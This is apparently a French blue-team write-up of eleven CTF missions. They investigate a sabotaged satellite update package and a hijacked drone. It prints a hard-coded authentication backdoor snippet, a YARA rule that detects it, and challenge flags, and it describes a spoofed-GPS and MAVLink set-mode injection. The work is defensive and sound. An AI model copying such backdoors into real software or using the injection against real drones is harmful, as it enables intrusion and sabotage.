Opération Icare & AEGIS

Concours de cybersécurité de l'Armée de l'Air et de l'Espace (Root-Me)  ·  11 missions résolues  ·  Crypto · Reverse · Forensic · Réseau · LID

Deux opérations liées, menées en approche Blue Team. Icare reconstitue le sabotage d'une chaîne de déploiement satellite : un paquet signé piégé, une porte dérobée d'authentification, puis la remontée jusqu'au compte compromis et le confinement des tâches malveillantes. AEGIS enchaîne sur le détournement d'un drone en vol par injection MAVLink, et attribue l'attaque jusqu'au boîtier physique et à la personne qui l'a introduit sur l'emprise. Fil conducteur : l'absence de signature, côté commits git comme côté trames radio.

Opération 1

Icare

Sabotage d'une chaîne de déploiement satellite — du paquet signé piégé jusqu'au confinement et à l'attribution.

1. Contrôle d'intégrité

Cryptographie
Énoncé : La chaîne de déploiement vérifie qu'un paquet correspond à ce qui a été signalé avant son envoi en orbite. Sur le paquet du soir, la vérification échoue à la signature — un transfert défectueux produirait le même symptôme.

Objectif : Calculer l'empreinte réelle du paquet livré et confirmer l'écart avec le manifeste signé.

Le manifeste annonce pour SAT-ALPHA-3 une empreinte SHA-256 et une taille de 2 943 octets. On recalcule l'empreinte réelle du paquet reçu :

# empreinte annoncée (manifeste)
9310f4c26ef83e56fd569ab8e3afd9e6cc959e6b9037d2a389ead0abada0bff8

# empreinte recalculée (paquet livré)
$ sha256sum update-SAT-ALPHA-3-4.7.2.tar.gz
65609e9a9e7710b8c1a1a9b2d56d7df2f3964eadf67edb2333103298c0e3eccf

Les deux ne correspondent pas, et la taille réelle (15 163 octets) dépasse largement celle annoncée. Ce n'est pas un transfert défectueux mais une altération volontaire : gzip -t passe, l'archive se liste entièrement, elle embarque un dossier .git/ inattendu, et le SHA256SUMS interne n'échoue que sur src/tcuplink/auth.py. La signature du manifeste, décodée depuis le base64, n'est qu'un texte factice entre balises BEGIN/END — le contrôle repose entièrement sur la comparaison du digest.

FlagRM{65609e9a9e7710b8c1a1a9b2d56d7df2f3964eadf67edb2333103298c0e3eccf}

Source · Page de manuel GNU coreutils — sha256sum affiche/vérifie des sommes SHA-256 (FIPS-180-2). gnu.org/software/coreutils/sha256sum

2. Analyse du paquet

Reverse
Énoncé : Ce paquet met à jour le service qui authentifie les ordres des opérateurs avant leur envoi au satellite. Comparer ses fichiers à ce qui a été signé, trouver celui qui a été modifié, lire ce qui y a été ajouté.

Objectif : Identifier le fichier modifié (chemin SHA256SUMS), relever l'identifiant d'opérateur en hexadécimal et le jeton codés en dur.

La vérification sha256sum -c SHA256SUMS n'échoue que sur un fichier : src/tcuplink/auth.py. L'historique git confirme que la version signée correspond au commit de release 4.7.2, et que la version livrée vient d'un commit postérieur ajoutant 10 lignes :

# Field-maintenance hook ajouté hors release
_MAINT_OPERATOR = 0xA5
_MAINT_TOKEN = bytes.fromhex("9e3ab7f04c118d26")

def verify_command(frame, keyring) -> bool:
    if frame.operator_id == _MAINT_OPERATOR \
       and frame.payload[:8] == _MAINT_TOKEN:
        return True   # court-circuite les 3 contrôles

C'est une porte dérobée d'authentification. Le test est placé avant les trois contrôles légitimes : opérateur 0xA5 absent du registre (operators.py ne liste que 0x11, 0x12, 0x21), aucun HMAC vérifié, aucun anti-rejeu. Toute trame portant l'opérateur 0xA5 et un payload commençant par ces 8 octets est acceptée et relayée au satellite.

FlagRM{src/tcuplink/auth.py:0xA5:9e3ab7f04c118d26}

Source · MITRE CWE-798, « Use of Hard-coded Credentials ». cwe.mitre.org/data/definitions/798

3. Remontée à la source

DevOps
Énoncé : Identifier le commit qui a introduit la porte dérobée et l'identité sous laquelle il a été poussé.

Objectif : Retrouver le commit et l'adresse e-mail de son auteur.

Un seul commit modifie auth.py après la release. L'objet brut donne le même nom et le même e-mail pour l'auteur et le committer, vérifiés octet par octet (aucun homoglyphe). Le compte a produit des commits légitimes auparavant : c'est bien un accès de développeur compromis.

$ git cat-file -p 2e192f3
author Camille Roussel <c.roussel@segment-sol.aae> ...
    auth: add field-maintenance recovery path
À noter — le commit n'est pas signé (pas d'en-tête gpgsig). L'identité git est simplement déclarée par le client : elle prouve le commit sous l'identité de Camille Roussel, pas que Camille Roussel l'a écrit. D'où la mission 6.
FlagRM{2e192f32d090bf23007a6563b37c5c219e43c4a1:c.roussel@segment-sol.aae}

Source · Pro Git, ch. 7.4 — vérifier l'origine d'un commit demande une signature GPG. git-scm.com · Signing Your Work

4. Identification d'IOC

Threat Hunting
Énoncé : Via un scanner YARA, identifier tous les paquets du lot porteurs de l'implant SAT-ALPHA-3 et lister leurs cibles.

Objectif : Donner les cibles porteuses de l'implant, triées alphabétiquement.

Le jeton 9e3ab7f04c118d26 n'existe que dans SAT-ALPHA-3 : l'attaquant a utilisé des valeurs différentes par cible. L'implant doit donc se reconnaître à son mécanisme, pas à ses valeurs. La règle YARA cible les noms de variables, la comparaison payload[:8] et le return True de contournement :

rule implant_sat_alpha3 {
  strings:
    $name_tok  = "_MAINT_TOKEN"
    $name_op   = "_MAINT_OPERATOR"
    $logic_cmp = "payload[:8]"
    $logic_ret = { 5F 4D 41 49 4E 54 5F [1-150] 3A
                   ( 0A | 0D 0A ) [0-20]
                   72 65 74 75 72 6E 20 54 72 75 65 }
  condition:
    any of them
}
Pièges du lot — trois leurres cassent les règles trop strictes. SAT-BETA-2 ne contient que payload[:8], légitime dans son planificateur (faux positif). Une règle exigeant le jeton ne trouve que SAT-ALPHA-3 ; une règle exigeant les deux noms rate GS-SUD et SAT-BETA-1. La comparaison avec les paquets « jumeaux » de même version (écart de taille) confirme les vrais porteurs.
FlagRM{GS-SUD:SAT-ALPHA-3:SAT-BETA-1:SAT-DELTA-2}

Source · Documentation YARA — chaînes texte / hexadécimales / regex, sauts [x-y] et alternatives. yara.readthedocs.io · Writing rules

5. Confinement

LID
Énoncé : Identifier les tâches mises en file par l'intrus sur l'orchestrateur et les bloquer toutes. Le bon blocage donne le flag.

Objectif : Bloquer exactement les tâches frauduleuses, sans oubli ni blocage d'une tâche légitime.

Trois jobs seulement portent l'opérateur illégitime 0xA5, mais le journal d'audit révèle que l'intrus a aussi usurpé des opérateurs légitimes. La signature fiable est dans les sessions : authentification maint (porte dérobée) ou HMAC valide mais depuis une IP externe, avec un compteur anti-rejeu à 0.

7f3a9cmaint203.0.113.41Porte dérobée
6e0b93maint203.0.113.77Porte dérobée

Ces trois sessions ont mis en file 7 tâches : DK-8072, DK-4846, DK-8973, DK-7432, DK-2372 (session 7f3a9c), DK-9476 (c21e55) et DK-1075 (6e0b93). Les jobs affichant 0x11 ou 0x21 dans la file sont des usurpations, trahies par leur sid et leur compteur à 0.

6. Attribution

Forensic
Énoncé : Camille Roussel affirme ne jamais avoir écrit ce commit. Le journal VPN filtré sur son compte et l'export complet de sa messagerie sont remis. Une connexion suit de près un message d'hameçonnage : c'est elle qui couvre le commit.

Objectif : Donner l'heure UTC de la connexion VPN frauduleuse et l'adresse de l'expéditeur du phishing.

Un seul message vient d'un domaine imitant l'organisation — segrnent-sol.aae (m → rn) — relayé depuis 203.0.113.41, l'IP de la porte dérobée de la mission 5, avec spf=fail. 21 minutes plus tard, une connexion VPN inhabituelle apparaît :

# client OpenConnect 9.17 (vs 9.12 habituel), IP externe
2026-11-05T20:31:05Z auth.ok user=c.roussel
  src=192.0.2.88 client=OpenConnect/9.17 tunnel=tun23

La session couvre le commit (21:14) et le push. La session propre de Camille Roussel était encore ouverte en parallèle depuis son IP habituelle — deux sessions simultanées.

FlagRM{2026-11-05T20:31:05Z:it-support@segrnent-sol.aae}

Source · RFC 7208 — un résultat SPF « Fail » déclare que le client n'est pas autorisé à utiliser le domaine. rfc-editor.org/rfc/rfc7208

Opération 2

AEGIS

Détournement d'un drone en vol par injection MAVLink — de la capture radio à l'attribution du matériel abandonné.

7. Capture du lien

Réseau
Énoncé : La position du drone a sauté, puis l'appareil a abandonné son plan de vol sans ordre de l'opérateur. Tout le trafic radio reçu depuis le décollage a été enregistré. La flotte pilote en MAVLink.

Objectif : Déterminer si un autre émetteur s'est adressé à l'appareil, l'instant UTC de réception de l'ordre et le nom MAVLink de la commande.

Les 45 127 trames sont en MAVLink v2 sans signature. Au niveau réseau, l'intrus réutilise MAC, IP et port de la station sol ; c'est l'identité MAVLink qui le trahit :

Émetteursysid / compidTrames
Station sol255 / 1901 041
Intrus42 / 1177

L'intrus envoie 176 messages GPS_INPUT falsifiés (position décalée d'environ 1,4 km) puis un unique COMMAND_LONG à 06:41:27 UTC : commande 176 MAV_CMD_DO_SET_MODE, param1=1 (custom mode), param2=15. Le drone répond par un ACK puis un STATUSTEXT « Mode GUIDED » et abandonne son plan AUTO.

FlagRM{2026-11-09T06:41:27Z:MAV_CMD_DO_SET_MODE}

Source · ArduPilot — changement de mode MAVLink (param1 = CUSTOM_MODE_ENABLED, param2 = n° de mode). ardupilot.org · mavlink.io

8. Investigation

Forensic
Énoncé : L'appareil tient son propre journal de bord (autopilote), plus fin que la liaison. Son horloge compte le temps depuis le démarrage — à recaler en UTC.

Objectif : Identifier la source de position suivie en plein vol, l'instant UTC de sa première trame et son numéro d'instance dans le champ I des messages GPS.

Le log DataFlash révèle un ArduPlane à deux GPS : GPS_TYPE=1 (u-blox embarqué, instance I=0) et GPS_TYPE2=14 (GPS alimenté par MAVLink, instance I=1), avec GPS_AUTO_SWITCH=1. Le faux GPS annonce 19 satellites et un HDOP de 0,61, meilleur que le vrai récepteur : l'autopilote le préfère.

Recalage horloge : l'écart entre TimeUS et le temps GPS du vrai récepteur est constant ; en retirant les 18 s intercalaires, la première trame GPS tombe à 06:34:30 UTC, exactement le début de la capture réseau.

9. Localisation de la source

Radiofréquence
Énoncé : Quatre antennes de surveillance spectrale couvrent l'emprise et ont toutes entendu l'émission.

Objectif : Croiser les portées des quatre antennes et donner la désignation de l'installation à l'intersection.

Trilatération à partir des quatre portées relevées sur la console, converties en mètres via l'échelle de la carte. Les quatre cercles se croisent sur un même point :

10. Matériel abandonné

Reverse
Énoncé : Un boîtier avec carte radio et antenne filaire a été trouvé au pied du pylône. Partiellement fondu, « nettoyé » avant sabotage, mais le début de la carte mémoire a été copié.

Objectif : Retrouver le point de contrôle vers lequel le boîtier ouvrait sa liaison, sous la forme adresse:port.

L'image contient deux partitions (FAT32 boot + ext4 rootfs d'un Raspberry Pi). Le service fieldlink.service lance un script effacé. Comme ext4 n'efface pas le contenu des blocs, debugfs récupère 6 fichiers supprimés — dont la configuration de liaison :

$ debugfs -R "lsdel" p2.img
$ debugfs -R "dump <118> uplink.conf" p2.img

# uplink.conf récupéré
endpoint = 198.51.100.47:8443
unit_id = fl-07
reconnect_s = 30

Le config.json récupéré reproduit exactement l'attaque observée : source_system=42, fenêtre 06:41:05 + 35 s, offsets ≈1,4 km, mode_delay=22,4 s, custom_mode=15. L'historique root effacé montre le ménage (suppression des dossiers, vidage des logs, history -c, poweroff) à 06:42:10 UTC.

FlagRM{198.51.100.47:8443}

Source · Image sdcard-partial.img (inodes supprimés 115–121) ; man debugfs pour lsdel. man7.org · debugfs

11. Attribution

Forensic
Énoncé : Le matériel entrant sur l'emprise est enregistré à l'arrivée, avec son étiquette et le nom de celui qui l'apporte. Le registre de l'année est transmis.

Objectif : Relever la date d'entrée du boîtier et le nom de celui qui l'a apporté.

Deux identifiants extraits de la carte pointent vers la même entrée du registre : l'adresse MAC b8:27:eb:4f:1a:9c (règle udev + journal dhcpcd) et le numéro de série FTDI A50285BI (journal noyau). Les deux lignes partagent le bon de livraison BL-2026-1184 :

2026-10-26 ; BL-2026-1184 ; Raspberry Pi 3 B+ ;
  8241-307714 ; b8:27:eb:4f:1a:9c ; Bruno Tessier
2026-10-26 ; BL-2026-1184 ; FTDI FT232R ;
  A50285BI ; Bruno Tessier
Leurre — le 23/10, la même personne a fait entrer un autre Pi + FTDI (MAC et n° de série différents). Seuls les identifiants exacts de la carte désignent le bon boîtier.
FlagRM{2026-10-26:bruno_tessier}

Source · Registre d'entrées (lignes 593–595) et sdcard-partial.img ; préfixe MAC b8:27:eb attribué à Raspberry Pi Foundation (registre IEEE). IEEE · MA-L registry

Bilan de la chaîne d'attaque

Les deux opérations forment une seule histoire défensive : un développeur hameçonné (phishing par domaine sosie) → un commit poussé sous son identité (porte dérobée d'authentification) → un paquet signé piégé déployé (contrôle d'intégrité contourné) → la réutilisation de la même infrastructure pour piloter un boîtier physique (injection MAVLink) détournant un drone → la remontée jusqu'au matériel et à la personne qui l'a introduit (attribution forensique).

Fil conducteur technique : l'absence de signature, qu'il s'agisse des commits git ou des trames MAVLink. C'est la recommandation centrale du rapport : signer et chiffrer la liaison de la flotte.
